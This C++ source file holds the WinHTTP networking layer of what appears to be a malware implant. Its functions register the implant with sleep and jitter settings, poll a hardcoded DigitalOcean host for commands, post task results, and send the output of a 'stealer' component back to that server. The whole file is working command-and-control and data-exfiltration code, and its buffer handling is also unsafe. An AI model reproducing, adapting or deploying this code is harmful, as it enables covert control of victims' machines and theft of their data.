#include "http.h"
#include <fstream> //for to file stuff
/* Initializing a LPCWSTR - https://stackoverflow.com/questions/17753607/initializing-a-lpctstr-lpcwstr */
#define OURURL L"sea-lion-app-f5nrq.ondigitalocean.app"

std::string HttpGetCommand(std::string uri, int implant_id)
{
    // Used Windows documentation for every function
    int temp = 0;
    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
    if (implant_id > 10)
    {
        temp = 2;
    }
    else
    {
        temp = 1;
    }
    int length = 7 + temp;
    char postdata[11];
    sprintf(postdata, "{\"id\":%d}", implant_id);

    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";

    /* Converts from string to wstring to LPCWSTR
       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
    */
    std::string result;
    // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
    HINTERNET hSession = WinHttpOpen(L"HTTP", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        return "WinHttpOpen Failed";
    }

    // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
    HINTERNET hConnect = WinHttpConnect(hSession, OURURL, 443, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return "WinHttpConnect Failed";
    }

    // GET string for WinHttpOpenRequest
    std::string get = "POST";
    std::wstring get_wstring(get.begin(), get.end());
    LPCWSTR getptr = get_wstring.c_str();

    std::wstring get_uri(uri.begin(), uri.end());
    LPCWSTR uriptr = get_uri.c_str();

    // The WinHttpOpenRequest function creates an HTTP request handle.
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        return "WinHttpOpenRequest Failed";
    }
    // WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);

    // The WinHttpSendRequest function sends the specified request to the HTTP server.
    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpSendRequest Failed";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpReceiveResponse Failed";
    }

    DWORD lpdwNumberOfBytesAvailable = 0;
    LPSTR lpBuffer = NULL;

    do
    {

        lpdwNumberOfBytesAvailable = 0;

        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpQueryDataAvailable Failed";
        }

        // Initializing Buffer with 4096 bytes
        lpBuffer = new char[4096];
        ZeroMemory(lpBuffer, 4096);

        DWORD lpdwNumberOfBytesRead = 0;

        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpReadData Failed";
        }

        result = result + lpBuffer;
        delete[] lpBuffer;

    } while (lpdwNumberOfBytesAvailable > 0);

    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hRequest);
    return result;
}
std::string HttpRegisterImplant(std::string uri, std::string jitter, std::string sleep){
    int temp = jitter.length() + sleep.length();
    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
    
    int length = 20 + temp;
    char postdata[50];
    sprintf(postdata, "{\"jitter\":%d , \"sleep\":%d }", std::stoi(jitter), std::stoi(sleep));

    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";

    /* Converts from string to wstring to LPCWSTR
       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
    */
    std::string result;
    

    // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
    HINTERNET hSession = WinHttpOpen(L"HTTP", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        return "WinHttpOpen Failed";
    }

    // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
    HINTERNET hConnect = WinHttpConnect(hSession, OURURL, 443, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return "WinHttpConnect Failed";
    }

    // GET string for WinHttpOpenRequest
    std::string get = "POST";
    std::wstring get_wstring(get.begin(), get.end());
    LPCWSTR getptr = get_wstring.c_str();

    std::wstring get_uri(uri.begin(), uri.end());
    LPCWSTR uriptr = get_uri.c_str();

    // The WinHttpOpenRequest function creates an HTTP request handle.
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        return "WinHttpOpenRequest Failed";
    }
    // WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);

    // The WinHttpSendRequest function sends the specified request to the HTTP server.
    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpSendRequest Failed";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpReceiveResponse Failed";
    }

    DWORD lpdwNumberOfBytesAvailable = 0;
    LPSTR lpBuffer = NULL;

    do
    {

        lpdwNumberOfBytesAvailable = 0;

        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpQueryDataAvailable Failed";
        }

        // Initializing Buffer with 4096 bytes
        lpBuffer = new char[4096];
        ZeroMemory(lpBuffer, 4096);

        DWORD lpdwNumberOfBytesRead = 0;

        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpReadData Failed";
        }

        result = result + lpBuffer;
        delete[] lpBuffer;

    } while (lpdwNumberOfBytesAvailable > 0);

    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hRequest);
    return result;
}
std::string HttpResponse(std::string uri, int implant_id, int task_id, std::string results, std::string success, std::string command){
    int var1;
    int var2;
    if (implant_id > 10)
    {
        var1 = 2;
    }else
    {
        var1 = 1;
    }
    if (task_id > 10)
    {
        var2 = 2;
    }else
    {
        var2 = 1;
    }

    int temp = var1 + var2 + results.length() + success.length() + command.length();
    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
    
    int length = 78 + temp;
    char *postdata = (char*) malloc(length);
    sprintf(postdata, "{\"target_implant_id\":%d,\"task_id\":%d,\"response_data\":\"%s\",\"success\":\"%s\",\"command\":\"%s\"}", implant_id, task_id, results.c_str(), success.c_str(), command.c_str());
    //std::cout << postdata << std::endl;
    //std::ofstream file("bad.txt");
    //file << postdata;

    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";

    /* Converts from string to wstring to LPCWSTR
       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
    */
    std::string result;
    

    // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
    HINTERNET hSession = WinHttpOpen(L"HTTP", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        return "WinHttpOpen Failed";
    }

    // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
    HINTERNET hConnect = WinHttpConnect(hSession, OURURL, 443, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return "WinHttpConnect Failed";
    }

    // GET string for WinHttpOpenRequest
    std::string get = "POST";
    std::wstring get_wstring(get.begin(), get.end());
    LPCWSTR getptr = get_wstring.c_str();

    std::wstring get_uri(uri.begin(), uri.end());
    LPCWSTR uriptr = get_uri.c_str();

    // The WinHttpOpenRequest function creates an HTTP request handle.
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        return "WinHttpOpenRequest Failed";
    }
    // WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);

    // The WinHttpSendRequest function sends the specified request to the HTTP server.
    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpSendRequest Failed";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpReceiveResponse Failed";
    }

    DWORD lpdwNumberOfBytesAvailable = 0;
    LPSTR lpBuffer = NULL;

    do
    {

        lpdwNumberOfBytesAvailable = 0;

        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpQueryDataAvailable Failed";
        }

        // Initializing Buffer with 4096 bytes
        lpBuffer = new char[4096];
        ZeroMemory(lpBuffer, 4096);

        DWORD lpdwNumberOfBytesRead = 0;

        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpReadData Failed";
        }

        result = result + lpBuffer;
        delete[] lpBuffer;

    } while (lpdwNumberOfBytesAvailable > 0);

    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hRequest);
    return result;
}


//Wyatts implementation to work with stealer
std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, json results, std::string success, std::string command)
{
    json resp;
    resp["target_implant_id"] = implant_id;
    resp["task_id"] = task_id;
    resp["response_data"] = results;
    resp["success"] = success;
    resp["command"] = command;
    int length = resp.dump().size();
    //printf("%d\n", length);
    char *postdata = (char *)malloc(length); 
    memcpy(postdata, resp.dump().c_str(),length);
   

    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";

    /* Converts from string to wstring to LPCWSTR
       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
    */
    std::string result;
    

    // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
    HINTERNET hSession = WinHttpOpen(L"HTTP", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        return "WinHttpOpen Failed";
    }

    // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
    HINTERNET hConnect = WinHttpConnect(hSession, OURURL, 443, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return "WinHttpConnect Failed";
    }

    // GET string for WinHttpOpenRequest
    std::string get = "POST";
    std::wstring get_wstring(get.begin(), get.end());
    LPCWSTR getptr = get_wstring.c_str();

    std::wstring get_uri(uri.begin(), uri.end());
    LPCWSTR uriptr = get_uri.c_str();

    //std::wcout << L"gabbagool " << uriptr << '\n';



    // The WinHttpOpenRequest function creates an HTTP request handle.
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        return "WinHttpOpenRequest Failed";
    }
    // WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);

    // The WinHttpSendRequest function sends the specified request to the HTTP server.
    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpSendRequest Failed";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpReceiveResponse Failed";
    }

    DWORD lpdwNumberOfBytesAvailable = 0;
    LPSTR lpBuffer = NULL;

    do
    {

        lpdwNumberOfBytesAvailable = 0;

        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpQueryDataAvailable Failed";
        }

        // Initializing Buffer with 4096 bytes
        lpBuffer = new char[4096];
        ZeroMemory(lpBuffer, 4096);

        DWORD lpdwNumberOfBytesRead = 0;

        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpReadData Failed";
        }

        result = result + lpBuffer;
        delete[] lpBuffer;

    } while (lpdwNumberOfBytesAvailable > 0);

    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hRequest);
    return result;
}